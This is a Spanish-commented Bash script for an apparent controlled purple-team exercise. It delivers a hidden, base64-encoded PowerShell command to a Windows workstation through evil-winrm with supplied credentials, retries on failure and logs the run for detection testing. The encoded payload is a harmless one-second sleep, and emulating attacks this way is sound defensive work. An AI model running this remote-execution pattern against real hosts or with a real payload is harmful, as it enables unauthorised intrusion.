#!/usr/bin/env bash
# Ataque 5: Ejecucion de payload malicioso (MITRE T1204.002 / T1059.001)
# Simula la entrega y ejecucion de un comando ofuscado tipo "living off the land",
# analogo al comportamiento observado tras macros maliciosas o adjuntos de phishing.
# Uso: ./attack5_payload_exec.sh <IP_WIN_WORKSTATION>
set -euo pipefail
source "$(dirname "$0")/_lib_log_ataque.sh"
TARGET="${1:?Uso: $0 <IP_ESTACION_WINDOWS>}"

INICIO=$(log_inicio)
echo "[+] Entregando y ejecutando payload de prueba en ${TARGET} via WinRM (evil-winrm)..."
# Requiere credenciales validas de un usuario local/dominio para el ejercicio controlado
read -rp "Usuario WinRM: " WU
read -rsp "Password WinRM: " WP; echo
CMD='powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQA='
LOGF="/tmp/payload_$(date +%s).log"
# evil-winrm no tiene un flag para ejecutar un solo comando (-e es la ruta de
# ejecutables C#, no un comando); es una shell interactiva, así que el
# comando se envía por stdin como si se hubiera escrito en el prompt remoto.
# Reintentos: el endpoint WinRM puede devolver un WinRMAuthorizationError
# transitorio bajo carga (p.ej. justo tras un Pass-the-Hash contra el mismo
# dominio). Se reintenta hasta 4 veces para no registrar como "ejecutado" un
# intento que realmente falló por un hiccup de autenticación momentáneo.
OK=0
for intento in 1 2 3 4; do
  { echo "${CMD}"; echo "exit"; } | evil-winrm -i "${TARGET}" -u "${WU}" -p "${WP}" > "$LOGF" 2>&1 || true
  if grep -q "Connection successful" "$LOGF"; then OK=1; break; fi
  echo "    (intento ${intento}: WinRM no respondió a la autenticación; reintentando...)"
  sleep 20
done
cat "$LOGF"
[ "$OK" -eq 1 ] && echo "[+] Payload ejecutado (WinRM shell establecida)." || echo "[!] WinRM no respondió tras 4 intentos."
log_fin "payload_execution" "T1059.001" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque registrado en log_ataques.csv"
